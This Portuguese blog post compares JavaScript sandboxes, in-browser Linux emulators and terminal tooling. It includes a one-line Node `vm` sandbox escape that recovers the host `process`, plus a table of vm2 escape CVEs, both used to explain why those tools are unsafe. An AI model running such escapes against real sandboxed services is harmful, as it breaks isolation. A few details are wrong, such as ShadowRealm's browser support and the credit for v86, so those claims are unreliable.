---
title: Comparação das soluções JavaScript para simulação de kernels Linux
description: Uma análise aprofundada das reconstituições de ambientes Linux
  em JavaScript/TypeScript.
date: 2026-05-28
authors:
  - fox3000foxy
tags:
  - javascript
  - linux
  - analysis
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEQcreZmmVx1U8zFHwsD+JTDIUKtMP5RYijaEkOIqZVfXIKA/i3h0lslw+ZgUBlLXKW3OVA2tGM8svcJWTXDxS8A=="
author_sig: "sdz6CkqFYLuzyWBGK5mpfxTm1P4Eil8+x6/upqacX57yscfIeyxCCNoKB1zlgV56VD16v7O00Xxo+lk88pR/pA=="
---

# Cada sandbox JavaScript, emulador, simulador e honeypot Linux -- comparado

Bom, então faz um tempo que estou muito fundo nessa toca de coelho lol. Tudo começou porque eu estava ajudando no [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) -- um projeto da Fortune (volto a isso daqui a pouco) -- e me perguntavam toda hora "espera, qual é a diferença com o `v86`?" ou "por que não usar `vm2`?" -- e percebi que não conseguia dar uma resposta clara sem mapear todo o ecossistema primeiro. Então é isso, aqui estamos eu acho xD

Acontece que existem quatro famílias distintas -- os sandboxes JS, os emuladores Linux, os simuladores Linux e os honeypots -- e elas quase nunca se sobrepõem, mesmo que sejam mencionadas constantemente na mesma frase. Alguém construindo um sistema de plugins usa `isolated-vm`. Alguém fazendo uma demo de ferramenta CLI usa `v86`. Alguém fazendo inteligência de ameaças SSH usa Cowrie. Eles resolvem problemas completamente diferentes sob o mesmo guarda-chuva vago de "rodar código dentro de uma caixa."

Passei muito tempo lendo código fonte, relatórios CVE, docs de arquitetura e páginas npm para escrever este artigo. Vai ser longo -- pega um café, sério. Ou dois.

> Pequeno disclaimer: `typescript-virtual-container` é destacado neste artigo porque foi o que desencadeou esta pesquisa. Tentei ser justo com todo o resto, mas mantenha esse contexto em mente.

---

## Parte 0 -- Primeiro, qual problema você está realmente resolvendo?

Antes de mergulhar, vale a pena ser preciso sobre a utilidade de cada família, porque a terminologia fica confusa rapidamente e as pessoas misturam tudo constantemente (eu inclusive, antes de sentar e mapear tudo direitinho).

**Os sandboxes JS** isolam código JavaScript do processo Node.js hospedeiro. O modelo de ameaça é: código JS não confiável que poderia chamar `process.exit()`, ler arquivos, ou lançar processos filhos. A solução é uma fronteira ao redor da execução V8. Essas ferramentas não têm noção de um shell Linux, de um sistema de arquivos com permissões, ou de SSH.

**Os emuladores Linux** rodam um kernel Linux real não modificado dentro de um emulador de CPU (x86, RISC-V, OR1K) implementado em JavaScript ou WebAssembly. Você inicia um SO real. Você tem syscalls reais. Você tem compatibilidade binária com programas compilados para x86. O custo em recursos é enorme.

**Os simuladores Linux** imitam o *comportamento* de um sistema Linux sem rodar um kernel real. Eles implementam um interpretador de shell, um sistema de arquivos virtual e semântica Unix suficiente para enganar programas e humanos. Sem kernel. Sem Wasm. Sem emulação de CPU. Muito menos recursos.

**Os honeypots** são projetados para atrair atacantes e registrar o que eles fazem. Não são principalmente ambientes de execução -- são ferramentas de observabilidade. A fidelidade ao comportamento real do Linux importa apenas na medida em que impede o atacante de detectar a armadilha.

Com esse quadro, aqui está onde cada projeto deste artigo se situa:

```
JS sandbox:       vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Emulador Linux:   v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Simulador Linux:  typescript-virtual-container (único neste espaço)
Honeypot:         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
Stack terminal:   xterm.js + node-pty (não é um isolador, mas relacionado)
```

---

## Parte 1 -- Os sandboxes JavaScript

### 1.1 `vm` -- o módulo nativo do Node.js (não é o que você pensa)

A resposta mais antiga para "executar JS não confiável" no Node é o módulo nativo `vm`. Ele existe desde a v0.1, então muitas pessoas o usam primeiro -- e se queimam.

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

O que `vm` realmente faz: ele cria um novo contexto V8 (um novo conjunto de construtores nativos -- `Object`, `Array`, `Function`, etc.) e executa código dentro dele, com uma referência compartilhada para o que você coloca em `sandbox`. Seu motor V8 não muda. Seu processo não muda. A memória é compartilhada.

A razão pela qual `vm` não oferece segurança alguma: a cadeia de protótipos do JavaScript é um DAG que conecta tudo a `Object.prototype`. Se você coloca um objeto do mundo hospedeiro no sandbox, o convidado pode subir pela sua cadeia de protótipos e alcançar os construtores hospedeiros. A partir de `Function`, você pode chamar `Function("return process")()` e recuperar o verdadeiro `process`. Game over. Tipo, imediatamente.

```js
// Isso funciona perfeitamente no vm -- você recupera o verdadeiro process
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

Quer dizer, a própria documentação do Node.js diz: "O módulo vm não é um mecanismo de segurança. Não o use para executar código não confiável." Este aviso está lá desde sempre. As pessoas o ignoram constantemente. Já vi aplicações em produção usando `vm` como sandbox. Por favor, não faça isso xD

**Veredito**: um mecanismo de escopo, não um sandbox. Use-o quando precisar isolar variáveis (motores de template, funcionalidades tipo `eval` onde você controla o código). Nunca para entradas não confiáveis.

**Memória**: sobrecarga negligenciável -- mesmo heap V8 que o processo hospedeiro.  
**Segurança**: nenhuma contra um atacante motivado.

---

### 1.2 `vm2` -- a tentativa da comunidade, e sua longuíssima morte

`vm2` foi a resposta da comunidade ao problema de fuga do `vm`. A ideia central: envolver cada objeto que cruza a fronteira do sandbox em um `Proxy` que intercepta acessos a propriedades, bloqueia a subida de protótipos, e filtra referências perigosas. Ideia inteligente na teoria! Nem tanto na prática, como veremos.

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // lança VMError, process inacessível
```

Por vários anos, funcionou razoavelmente bem. Mas a superfície de ataque dos `Proxy` JavaScript é enorme. Cada nova funcionalidade da linguagem JS -- geradores, iteradores assíncronos, `Symbol.toPrimitive`, `Error.prepareStackTrace`, os slots internos de `Promise` -- é um vetor de contorno potencial.

A cronologia das CVEs é... algo. Tipo, olha isso:

| Data | CVE | Mecanismo |
|------|-----|-----------|
| Out 2022 | CVE-2022-36067 | Fuga do contexto hospedeiro via `Error.prepareStackTrace` |
| Abr 2023 | CVE-2023-29017 | Vazamento de objeto hospedeiro via erro async não tratado |
| Abr 2023 | CVE-2023-29199 | Contorno da sanitização de exceções via `handleException()` |
| Abr 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| Mai 2023 | CVE-2023-32314 | `Proxy` em `Error.name` → `Function` → RCE |
| Jun 2023 | CVE-2023-37466 | Função async + estouro de pilha + `Proxy.getPrototypeOf` |
| Jun 2023 | CVE-2023-37903 | Worker thread + fuga por eval |

Três CVEs críticas no mesmo mês (abril de 2023). TRÊS. EM UM MÊS. Após a CVE-2023-37903, o mantenedor oficialmente depreciou a biblioteca com a mensagem: *"A biblioteca contém problemas de segurança críticos e não deve ser usada em produção."*

O mantenedor a ressuscitou em outubro de 2025 com a versão 3.10.0, alegando ter corrigido tudo o que era conhecido na época. Uma nova fuga crítica (CVE-2026-22709, CVSS 9.8) foi divulgada em janeiro de 2026, seguida por um lote de outras onze em maio de 2026. Onze. O padrão não mudou e honestamente não acho que mudará algum dia.

O problema fundamental é arquitetural -- e é a lição que levou um tempo para todo o ecossistema aprender. Você não pode construir um sandbox seguro usando a mesma linguagem que você isola, no mesmo motor, no mesmo processo. A superfície de fuga é a implementação inteira do V8 -- e o V8 tem vários milhões de linhas de C++ que mudam constantemente. Cada nova funcionalidade JS potencialmente abre um novo caminho de ataque.

**Veredito**: Não usar para aplicações sensíveis à segurança. Mesmo na versão mais recente, novos contornos são descobertos a cada poucos meses. O próprio mantenedor reconheceu isso abertamente.

---

### 1.3 `isolated-vm` -- aquele que realmente funciona

`isolated-vm` adota a abordagem correta: usar a primitiva de isolamento nativa do V8, o Isolate. Cada Isolate V8 tem seu próprio heap, seu próprio coletor de lixo, seu próprio conjunto de nativos, e zero referência compartilhada com outros Isolates.

É a mesma fronteira que o Chrome usa entre as abas. É uma verdadeira barreira de segurança, não um truque de linguagem construído sobre Proxies.

```js
import ivm from "isolated-vm";

// Cada isolate é seu próprio heap V8
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // limite em MB
const context = await isolate.createContext();
const jail = context.global;

// Passar dados através da fronteira requer serialização explícita
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // Não pode alcançar o processo hospedeiro, o heap hospedeiro ou os módulos hospedeiros
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// Você pode encerrar abruptamente por timeout ou limite de memória
isolate.dispose(); // libera todo o heap
```

Os tipos `Reference` e `ExternalCopy` são a ponte de comunicação explícita. Uma `Reference` dá ao isolate um handle chamável para uma função hospedeira -- o isolate pode chamá-la mas não pode inspecionar seu fechamento ou protótipo. Um `ExternalCopy` serializa um valor (clone estruturado) através da fronteira do heap. Este modelo de ponte explícita não é prático, mas é o que torna o isolamento real.

Você pode definir limites de recursos estritos: memória (o isolate é encerrado se ultrapassar o limite), timeout de relógio de parede e timeout de CPU. O encerramento é real -- ele mata todo o Isolate V8, não apenas um timeout JS que pode ser contornado com um `while(true)`.

**Limites**: é JS apenas. Você não pode executar bash dentro dele. Não há noção de arquivos, permissões, rede ou processos. É exatamente a ferramenta certa para JS submetido pelo usuário (plugins, fórmulas, hooks de script), e a ferramenta errada para todo o resto. A autora do `typescript-virtual-container` mencionou que o considerou no início antes de perceber que "executar comandos shell" e "isolar JavaScript" são problemas fundamentalmente diferentes.

**Memória**: ~3-10 MB por isolate vazio, aumenta com o uso do heap.  
**Segurança**: sólida. A fronteira V8 Isolate é a verdadeira primitiva de isolamento.  
**npm**: [isolated-vm](https://www.npmjs.com/package/isolated-vm)  
**GitHub**: [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten` -- um motor JS separado compilado em Wasm

Uma abordagem diferente: em vez de isolar dentro do V8, rodar um motor JavaScript completamente separado compilado em WebAssembly. O hospedeiro roda no V8/Node. O convidado roda no QuickJS-dentro-Wasm. O sandbox Wasm fornece a fronteira de isolamento.

QuickJS é mais uma obra de Fabrice Bellard (o mesmo cara por trás do QEMU, FFmpeg, JSLinux, TinyEMU -- essa pessoa não é real, sério, como é que uma única pessoa faz tudo isso?). É um pequeno motor JS compatível com o padrão ES2023 escrito em C, e compilado em Wasm tem apenas cerca de 500 KB.

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // Executa no QuickJS, completamente separado do V8
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS é um pequeno motor JavaScript compatível com ES2023 escrito em C. Compilado em Wasm, tem cerca de 500 KB para a variante síncrona, ~1 MB para a variante assíncrona (Asyncify). O gerenciamento de memória é manual -- cada valor que você extrai da VM deve ser explicitamente liberado, o que é um pouco chato mas previne surpresas de GC entre fronteiras. Uma troca divertida!

O wrapper `@sebastianwessel/quickjs` adiciona uma API mais ergonômica por cima, com um sistema de arquivos virtual opcional, suporte a fetch e stubs de módulos Node.js:

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

O modelo de segurança é diferente do `isolated-vm`: o modelo de memória linear do Wasm faz com que o convidado não possa acessar diretamente os objetos do heap V8. A superfície de ataque é a interface hospedeiro↔Wasm (imports/exports), não toda a linguagem JS. Isso é geralmente considerado mais robusto que os sandboxes baseados em Proxy.

O contra: QuickJS não tem o mesmo nível de otimização que o V8. Para cargas CPU-bound em JS, é 5 a 20 vezes mais lento que o V8. Para pequenos trechos de código e avaliações não confiáveis, isso geralmente não importa.

**Memória**: ~500 KB módulo Wasm + heap por instância.  
**Segurança**: fronteira Wasm, considerada mais sólida que abordagens baseadas em Proxy.  
**npm**: [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)  
**GitHub**: [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno -- um runtime que coloca permissões em primeiro lugar

Deno adota uma filosofia completamente diferente: em vez de fazer sandbox dentro do Node, construir um novo runtime que é seguro por padrão. Eu realmente gosto dessa abordagem -- é o que Node.js deveria ter sido desde o começo, honestamente. Ryan Dahl (o criador original do Node.js) literalmente criou o Deno porque se arrependia de algumas decisões de design do Node.js, o que é bem louco quando se pensa nisso.

Cada capacidade sensível (leitura de arquivo, escrita de arquivo, rede, ambiente, subprocesso) requer um flag `--allow-*` explícito:

```bash
# Este só pode ler dentro de /data, nada mais
deno run --allow-read=/data script.ts

# Este só pode acessar um único domínio
deno run --allow-net=api.example.com script.ts

# Sem flags = nenhuma permissão
deno run untrusted.ts # não pode ler, escrever, rede, executar
```

O modelo de permissões é implementado no nível Rust/SO -- não é um truque JS. Quando código Deno chama `Deno.readFile()`, passa por uma operação Rust que verifica a tabela de permissões antes de tocar no sistema de arquivos. Você não pode contorná-lo a partir do JS porque a chamada de sistema nunca acontece se a permissão não for concedida.

Para executar código verdadeiramente não confiável, os Workers Deno (Web Workers) fornecem um segundo isolate no mesmo processo, cada um com seu próprio conjunto de permissões. Você pode lançar um worker com zero permissões e se comunicar com ele via `postMessage`.

Deno 2 (lançado em outubro de 2024) adicionou compatibilidade npm completa e shims de compatibilidade Node.js, o que melhorou consideravelmente sua adoção para casos de uso no lado do servidor.

**A troca**: o modelo de segurança do Deno é excelente para código em que você poderia confiar parcialmente. Para código completamente não confiável que poderia ser adversarial, o modelo de permissões não ajuda -- você precisa de uma fronteira Isolate (`isolated-vm`) ou de um motor diferente (`quickjs-emscripten`), porque o Deno ainda usa V8 e atacantes sofisticados podem encontrar bugs no nível V8.

---

### 1.6 TC39 ShadowRealm -- a resposta padronizada (um dia)

O órgão de padronização JavaScript (TC39) tem uma proposta chamada ShadowRealm que tenta padronizar o que `vm` e `vm2` tentavam fazer, mas com um modelo de segurança correto. Um ShadowRealm cria um contexto de execução JS isolado com seus próprios intrínsecos, nenhum acesso ao reino exterior, e uma interface de import/export cuidadosamente controlada.

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // Intrínsecos separados, sem acesso ao reino exterior
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm está disponível nos navegadores (Chrome 90+, Firefox 105+) mas ainda não está no Node.js estável em 2026. A proposta TC39 Compartments se baseia nele para isolamento no nível de módulos. São as respostas padronizadas de longo prazo, mas ainda não estão prontas para produção no lado do servidor Node. É uma dessas coisas que você vê chegando de longe mas... simplesmente ainda não chegou. Clássico TC39 xD

---

### Resumo da família dos sandboxes

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **Fronteira de isolamento** | nenhuma (escopo) | Proxy (quebrado) | V8 Isolate | Wasm | V8 Isolate + perms Rust |
| **Limite de memória** | ❌ | ❌ | ✅ limite estrito | ✅ heap Wasm | parcial |
| **Timeout CPU** | ❌ | ✅ (contornável) | ✅ estrito | ✅ | ✅ |
| **Segurança** | nenhuma | quebrada | sólida | sólida | sólida |
| **Velocidade JS** | V8 nativo | V8 nativo | V8 nativo | ~10x mais lento | V8 nativo |
| **Navegador** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Compatibilidade Node** | nativo | ✅ | ✅ | shims parciais | parcial |
| **Status** | estável | arriscado (novas CVEs) | ✅ ativo | ✅ ativo | ✅ ativo |
| **Sobrecarga RAM** | ~1 MB | ~5-20 MB | ~3-10 MB | ~5-15 MB | ~10-30 MB |

O veredito: se a segurança importa para você, existem exatamente duas opções reais -- `isolated-vm` (extensão nativa, V8 Isolate, velocidade JS total) e `quickjs-emscripten` (Wasm, compatível com navegador, ~10x mais lento para cálculo intensivo). Todo o resto é "por favor não faça isso" (`vm`, `vm2`) ou um runtime que resolve um problema completamente diferente (Deno). ShadowRealm pode mudar o jogo um dia, mas ainda não é o caso.

---

## Parte 2 -- Os emuladores Linux em JavaScript

É aqui que as coisas ficam realmente interessantes para mim. Estes são *verdadeiros* emuladores -- eles implementam um conjunto de instruções de CPU em JavaScript ou WebAssembly, iniciam uma imagem real de kernel Linux e executam binários reais do userspace. O isolamento vem do fato de que o convidado e o hospedeiro não compartilham nada: espaços de memória diferentes, fluxos de instruções diferentes.

O preço a pagar é enorme, mas o que você obtém é verdadeiramente notável: Linux real, rodando de verdade, no seu navegador ou processo Node. Tipo, é bem louco quando se pensa nisso, né?

### 2.1 `v86` -- emulador PC x86 em JS + JIT Wasm

`v86` por Fabrice (copy no GitHub) é o emulador x86 open-source mais capaz em JavaScript. Começou como um interpretador JS puro por volta de 2013 e evoluiu para um sistema JIT onde blocos básicos x86 são traduzidos para WebAssembly em tempo real, melhorando consideravelmente o desempenho.

O que ele emula:
- **CPU**: x86-32 (IA-32), conjunto de instruções aproximadamente no nível Pentium 1. Sem 64-bit (x86-64) -- é um limite arquitetural de hardware, não uma funcionalidade faltando.
- **FPU**: via `Float64Array` do JavaScript. O x87 é em precisão estendida 80-bit; os doubles JS são em 64-bit. Isso significa que os resultados em ponto flutuante podem diferir ligeiramente de uma CPU real.
- **Memória**: configurável, mapeia para um `SharedArrayBuffer` ou `ArrayBuffer` no heap JS.
- **Hardware**: 8254 PIT (timer), 8259 PIC (controlador de interrupções), controlador de teclado 8042 (PS/2), CMOS RTC, VGA com extensões SVGA e Bochs VBE, controlador IDE, controlador de disquete (8272A), placa de rede NE2000.
- **BIOS**: usa SeaBIOS (BIOS x86 open-source).

O JIT funciona identificando blocos básicos (sequências de instruções x86 sem saltos), traduzindo-os em uma função WebAssembly, armazenando essa função em cache e chamando-a nas execuções seguintes do mesmo bloco. Caminhos de código quente obtêm desempenho Wasm nativo. Caminhos frios caem de volta no interpretador JS.

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 MB
  autostart: true,
});

// Capturar a saída serial (console kernel Linux)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// Enviar entrada para o convidado (digitar no shell)
emulator.serial0_send("ls /\n");
```

**SOs suportados**: Alpine Linux (excelente), Ubuntu 16.04/18.04 (i386 apenas), Arch Linux 32, ReactOS, FreeDOS, Windows 9x/2000 (com ressalvas), MS-DOS.

**Tempo de inicialização**: 15-40 segundos para Alpine Linux a partir de uma imagem limpa. É inerente à inicialização real do kernel -- você não pode pulá-la. Sim, seus usuários vão assistir um kernel Linux iniciar no navegador deles. É o acordo xD

**Memória mínima**: 100-256 MB por instância. Só o cache de código Wasm JIT pode chegar a dezenas de MB para uma instância Linux ocupada.

**Uso no Node.js**: totalmente suportado. Não precisa de DOM -- a saída VGA pode ser ignorada se você só se interessa pela saída serial.

**O que você não pode fazer**: executar binários 64-bit, usar funcionalidades modernas do kernel (eBPF, io_uring, etc.), ou rodar mais que um punhado de instâncias simultaneamente sem atingir os limites de memória.

**npm**: [v86](https://www.npmjs.com/package/v86) -- atualizado continuamente, última publicação no mesmo dia enquanto escrevo.  
**GitHub**: [copy/v86](https://github.com/copy/v86)  
**Demo**: [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux e TinyEMU -- o trabalho do Bellard, em duas vezes

JSLinux é o próprio emulador Linux em JavaScript de Fabrice Bellard -- o primeiro de todos, publicado em 2011. Continuo mencionando Bellard neste artigo porque ele não para de aparecer: QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. Esse cara é algo de outro nível. Realmente uma das contribuições técnicas individuais mais impressionantes da história do software, sem exagero.

O JSLinux original era um interpretador x86 puro JS. Em 2016, Bellard escreveu o TinyEMU (um emulador RISC-V em C), o compilou para JavaScript via Emscripten, e isso se tornou a base do JSLinux atual. Portanto, o JSLinux atual é na verdade código C que gera JavaScript -- não é JS escrito à mão.

As notas técnicas no site do Bellard valem a pena serem lidas: o JSLinux atual roda uma CPU RISC-V 32 ou 64-bit (não x86), emulando um console VirtIO, uma rede VirtIO, um dispositivo de bloco VirtIO e um sistema de arquivos 9P para compartilhamento de arquivos com o hospedeiro. A demo JS é compilada a partir de C usando Emscripten -- não é JS escrito à mão.

O TinyEMU em si suporta:
- RISC-V RV32IMAFDQC e RV64IMAFDQC (32 e 64-bit, com ponto flutuante, multiplicação, instruções comprimidas)
- x86 via KVM (nativo apenas, sem emulação -- então a versão JS é RISC-V apenas)
- Console VirtIO, rede, bloco, entrada, sistema de arquivos 9P

TinyEMU tem uma demonstração JavaScript fornecida via Emscripten. É a base do JSLinux e também é usado pelo `container2wasm` (veja seção 2.5).

**Status JSLinux**: sem pacote npm, sem API programável. É uma demo que você abre no seu navegador. A importância histórica é grande -- provou o conceito. A utilidade prática como biblioteca: nenhuma.

**TinyEMU**: não está no npm, código fonte C disponível em [bellard.org/tinyemu](https://bellard.org/tinyemu/).

---

### 2.3 jor1k -- emulador OR1K

jor1k é um emulador OpenRISC 1000 (OR1K) escrito em JavaScript por Sebastian Macke. É interessante historicamente porque o jor1k introduziu o suporte ao sistema de arquivos VirtIO 9P, que Bellard depois integrou no TinyEMU e JSLinux. A polinização cruzada entre esses projetos é intensa -- eles pegam emprestadas coisas uns dos outros, o que é honestamente uma das coisas mais legais do trabalho de emulação open-source.

**Status**: não é mais mantido ativamente, sem pacote npm. Arquivado neste ponto. Útil de conhecer principalmente pelo contexto histórico -- tipo se alguém mencionar jor1k numa conversa, agora você sabe o que é :)

---

### 2.4 CheerpX -- emulador x86 comercial para o navegador

CheerpX por Leaning Technologies é o emulador Linux x86 comercial de qualidade produção. Não é open-source, mas é significativamente mais capaz que o v86 para rodar um userspace real Debian/Ubuntu. Se você precisa de um VSCode real no navegador, é isso que você quer.

Diferenças chave com o v86:
- Suporta um ISA mais amplo (mais extensões x86, melhor compatibilidade glibc)
- Sistema de arquivos baseado em IndexedDB no navegador (persistente entre recarregamentos de página)
- Suporte a pthread via `SharedArrayBuffer` (que requer os cabeçalhos COOP/COEP -- sim, esses cabeçalhos de segurança chatos)
- Projetado para rodar VSCode, Python, Node.js e outras aplicações reais -- não apenas imagens de SO mínimas
- Suporte profissional e SLA disponível (aka você pode xingar alguém se quebrar)

O caso de uso típico é "rodar uma aplicação Linux real no navegador sem servidor." Empresas o usam para IDEs baseados em navegador, tutoriais de código e documentação interativa.

```js
// API CheerpX (simplificada)
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**História com Node.js**: CheerpX é primeiramente projetado para o navegador. O emulador subjacente poderia teoricamente funcionar no Node (é Wasm), mas a API e a documentação são inteiramente voltadas para uso no navegador. O uso no lado do servidor não é suportado.

**Memória**: similar ao v86 -- 200+ MB para uma instância Debian real.  
**Precificação**: gratuito para projetos open-source, licença comercial para SaaS em produção.  
**Docs**: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers (StackBlitz) -- Node.js em Wasm, não é emulação Linux

Os WebContainers são frequentemente colocados no mesmo saco que os emuladores Linux mas são arquiteturalmente diferentes. Eles não emulam x86. Eles não iniciam Linux. Eles rodam Node.js compilado em WebAssembly usando WASI. Essa distinção conta muito e passei tempo demais confuso sobre isso lol.

Acho que a confusão vem do marketing -- "rodar Node.js no seu navegador" parece emulação, mas é na verdade o próprio Node.js compilado em Wasm, não uma emulação Linux rodando Node.js dentro de uma VM. Uma coisa completamente diferente.

A arquitetura:
1. Node.js é compilado em Wasm (um runtime WASI personalizado especificamente)
2. Um Service Worker intercepta requisições de rede do servidor Node.js emulado e as roteia para a aba do navegador
3. O sistema de arquivos vive na memória do navegador (sem E/S de disco)
4. npm é uma implementação personalizada otimizada para uso no navegador

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// Escrever arquivos
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Executar comandos Node.js
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

Como isso executa Node.js real (compilado em Wasm), você tem npm real, APIs Node.js reais e resolução de módulos real. Você não tem um userspace Linux de propósito geral -- você não pode instalar pacotes de sistema com `apt`, executar binários compilados arbitrários, ou fazer muita coisa fora do ecossistema Node.js.

**Pré-requisitos do navegador**: SharedArrayBuffer (requer cabeçalhos COOP/COEP), suporte a Service Worker, Wasm moderno.

**História com Node.js**: projetado exclusivamente para uso no navegador. A API não funciona fora de um contexto de navegador.

**npm**: [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)  
**Docs**: [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm -- contêineres Docker compilados em Wasm

`container2wasm` é uma ferramenta (não um pacote npm) da NTT que pega uma imagem de contêiner Docker e a converte em um binário WebAssembly que pode rodar em qualquer hospedeiro Wasm -- incluindo um navegador. Quando vi isso pela primeira vez, realmente não acreditei que funcionava.

O mecanismo:
- Para contêineres x86_64: embarca Bochs (um emulador x86, compilado em Wasm) + o sistema de arquivos raiz do contêiner
- Para contêineres riscv64: embarca TinyEMU (Bellard de novo!) + o sistema de arquivos raiz do contêiner
- O arquivo `.wasm` resultante inicia o emulador, monta o sistema de arquivos do contêiner e executa o ponto de entrada do contêiner

```bash
# Converter um contêiner Ubuntu 22.04 em Wasm
c2w ubuntu:22.04 out.wasm

# Executá-lo
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# Ou servi-lo para uso no navegador
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

O `.wasm` resultante é grande -- um Ubuntu mínimo tem várias centenas de MB -- mas é completamente autônomo. Você pode enviar um `.wasm` por email para alguém e ele pode rodar Ubuntu no navegador. Essa frase não deveria fazer sentido mas aqui estamos.

**GitHub**: [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### Resumo da família dos emuladores

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **Arquitetura** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (proprietário) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **Kernel real** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64-bit** | ❌ | ✅ (RISC-V) | ❌ | ✅ | n/a | ✅ |
| **Pacote npm** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (ferramenta CLI) |
| **Uso Node.js** | ✅ | ❌ | ❌ | ❌ | ❌ (navegador apenas) | via Wasmtime |
| **Uso navegador** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/instância** | 150-256 MB | ~64-128 MB | ~64 MB | 200+ MB | ~100 MB | ~200-500 MB |
| **Tempo inicialização** | 15-40s | 10-30s | 10-30s | 15-40s | 2-5s | 10-40s |
| **Open source** | ✅ | ✅ | ✅ | ❌ | parcial | ✅ |
| **Status** | ✅ muito ativo | ✅ estável | ⚠️ arquivado | ✅ comercial | ✅ ativo | ✅ ativo |

O que salta aos olhos nesta tabela: `v86` é o único que é um pacote npm, roda tanto no navegador quanto no Node, e é open-source. É por isso que domina a conversa sobre "emuladores Linux em JavaScript". Todo o resto tem uma desvantagem -- JSLinux não tem API, jor1k está arquivado, CheerpX custa dinheiro, WebContainers é apenas navegador e específico para Node, container2wasm requer uma etapa de build e um CLI. Se você só precisa de "iniciar Linux em JavaScript", `v86` é quase sempre o ponto de partida certo.

---

## Parte 3 -- As stacks de terminal: xterm.js e node-pty

Dois pacotes voltam constantemente quando as pessoas constroem experiências do tipo shell. Não são sandboxes ou emuladores -- são a canalização UI e PTY -- mas são tão relacionados que me sentiria mal em deixá-los de fora. Além disso, usei ambos e são realmente bons.

### 3.1 `xterm.js` -- a renderização de terminal

xterm.js é um emulador de terminal para o navegador. Ele exibe uma tela de terminal (sequências de escape VT100/xterm) em um elemento `<canvas>`, gerencia entradas de teclado e expõe uma API para rotear dados.

Usado por: o terminal integrado do VS Code, Azure Cloud Shell, Proxmox VE, AWS CloudShell e muitos outros.

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// Enviar dados para o terminal (exibido como texto)
term.write("$ ");
term.onData(data => {
  // data são as teclas pressionadas -- envia para seu backend
  socket.send(data);
});
socket.onmessage(msg => {
  // saída do backend -- exiba-a
  term.write(msg.data);
});
```

xterm.js é apenas a camada de renderização. Ele não executa shell. Ele não interpreta comandos. É um widget de exibição que você conecta ao backend de sua escolha. Muitas pessoas pensam que xterm.js "faz o terminal" mas é realmente só a tela -- você ainda precisa conectá-lo a algo que realmente execute comandos.

**npm**: [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)  
